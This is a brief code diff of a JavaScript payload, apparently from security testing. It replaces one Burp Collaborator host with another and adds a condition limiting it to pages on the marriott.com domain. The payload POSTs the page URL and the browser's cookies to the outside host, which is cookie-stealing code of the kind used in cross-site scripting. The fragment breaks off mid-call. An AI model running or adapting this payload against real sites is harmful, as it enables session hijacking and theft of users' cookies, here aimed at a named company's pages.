@@ -1,4 +1,5 @@
-fetch('https://wbbyp3rorx03mjat4t03rg7omfs5gu.burpcollaborator.net', {
+if (document.domain.match(/^.+marriott.com/g)) {
+fetch('https://tpmy24viitda4vcd6a9xvskf96fw3l.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body:document.location.href+" : "+document.cookie
